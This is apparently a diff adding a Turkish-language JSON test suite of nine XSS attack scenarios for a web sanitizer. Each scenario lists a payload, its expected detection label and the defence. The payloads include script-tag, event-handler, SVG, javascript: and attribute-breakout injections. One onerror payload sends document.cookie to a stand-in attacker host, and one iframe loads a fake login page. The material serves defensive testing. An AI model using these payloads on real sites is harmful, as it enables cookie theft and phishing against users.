@@ -1,0 +1,86 @@
+{
+  "aciklama": "Gün 160 XSS Türleri ve Savunma Test Paketi - 9 Negatif Kontrol Saldırı Senaryosu",
+  "senaryolar": [
+    {
+      "senaryo_id": "SCN-XSS-01",
+      "baslik": "Klasik Reflected Script Tag Enjeksiyonu",
+      "tur": "REFLECTED_XSS",
+      "beklenen_tespit": "SCRIPT_TAG_INJECTION",
+      "hedef_baglam": "html_body",
+      "payload": "<script>alert('Reflected XSS Session Hijack')</script>",
+      "savunma_aksiyonu": "Script etiketinin tamamen ayıklanması veya &lt;script&gt; olarak kodlanması"
+    },
+    {
+      "senaryo_id": "SCN-XSS-02",
+      "baslik": "Stored Inline Event Handler (onerror) ile Çerez Hırsızlığı",
+      "tur": "STORED_XSS",
+      "beklenen_tespit": "INLINE_EVENT_HANDLER",
+      "hedef_baglam": "html_body",
+      "payload": "<img src=invalid.jpg onerror=\"fetch('https://attacker.evil/exfil?c='+document.cookie)\">",
+      "savunma_aksiyonu": "onerror olay dinleyicisinin ayıklanması ve img etiketinin allowlist dışı ise engellenmesi"
+    },
+    {
+      "senaryo_id": "SCN-XSS-03",
+      "baslik": "DOM Tabanlı innerHTML ve location.search Kaynak-Havuz Akışı",
+      "tur": "DOM_BASED_XSS",
+      "beklenen_tespit": "CRITICAL_DOM_XSS",
+      "hedef_baglam": "javascript",
+      "payload": "let userQuery = location.search;\ndocument.getElementById('results').innerHTML = userQuery;",
+      "savunma_aksiyonu": "innerHTML yerine textContent kullanımı ve DOMPurify ile arındırma"
+    },
+    {
+      "senaryo_id": "SCN-XSS-04",
+      "baslik": "Link Etiketinde javascript: Sözde Protokol İstismarı",
+      "tur": "REFLECTED_XSS",
+      "beklenen_tespit": "DANGEROUS_PSEUDO_PROTOCOL",
+      "hedef_baglam": "html_attribute",
+      "payload": "<a href=\"javascript:alert(document.domain)\">Ücretsiz Bakiye Yükle</a>",
+      "savunma_aksiyonu": "javascript: protokolünün URL şema doğrulamasında reddedilerek href niteliğinin temizlenmesi"
+    },
+    {
+      "senaryo_id": "SCN-XSS-05",
+      "baslik": "SVG onload Vektörü ile Kod Yürütme",
+      "tur": "MUTATION_XSS",
+      "beklenen_tespit": "SVG_MATHML_INJECTION",
+      "hedef_baglam": "html_body",
+      "payload": "<svg onload=\"alert('SVG XSS')\"><circle r=10/></svg>",
+      "savunma_aksiyonu": "SVG etiketinin allowlist dışı olması sebebiyle tamamen engellenmesi"
+    },
+    {
+      "senaryo_id": "SCN-XSS-06",
+      "baslik": "Gömülü iframe ile Phishing ve Clickjacking Enjeksiyonu",
+      "tur": "REFLECTED_XSS",
+      "beklenen_tespit": "DANGEROUS_HTML_TAG",
+      "hedef_baglam": "html_body",
+      "payload": "<iframe src=\"https://malicious-login-portal.org/fake-login\" width=\"600\" height=\"400\"></iframe>",
+      "savunma_aksiyonu": "iframe etiketinin allowlist dışı bırakılarak ayıklanması"
+    },
+    {
+      "senaryo_id": "SCN-XSS-07",
+      "baslik": "DOM Clobbering ile Window / Document Nesnelerini Gölgeleme",
+      "tur": "DOM_BASED_XSS",
+      "beklenen_tespit": "DOM_CLOBBERING_ATTEMPT",
+      "hedef_baglam": "html_body",
+      "payload": "<form id=\"document\"><input name=\"cookie\" value=\"fake_token=xyz\"></form>",
+      "savunma_aksiyonu": "DOM nesnelerini gölgeleyen form/input etiketlerinin temizlenmesi"
+    },
+    {
+      "senaryo_id": "SCN-XSS-08",
+      "baslik": "Güvensiz Wildcard ve 'unsafe-inline' İçeren Zayıf CSP Başlığı",
+      "tur": "REFLECTED_XSS",
+      "beklenen_tespit": "WEAK_CSP_POLICY",
+      "hedef_baglam": "csp",
+      "payload": "default-src * 'unsafe-inline' 'unsafe-eval'",
+      "savunma_aksiyonu": "CSP denetleyicisinin unsafe-inline, unsafe-eval ve wildcard yönergelerini yüksek risk olarak işaretlemesi"
+    },
+    {
+      "senaryo_id": "SCN-XSS-09",
+      "baslik": "HTML Nitelik Kırıcı ve Otomatik Odaklanma (autofocus onfocus) Vektörü",
+      "tur": "REFLECTED_XSS",
+      "beklenen_tespit": "INLINE_EVENT_HANDLER",
+      "hedef_baglam": "html_attribute",
+      "payload": "\" onfocus=\"alert(document.cookie)\" autofocus=\"",
+      "savunma_aksiyonu": "Tırnak ve boşluk karakterlerinin onaltılık varlıklara (&#x22;, &#x20;) dönüştürülerek nitelikten taşmanın engellenmesi"
+    }
+  ]
+}
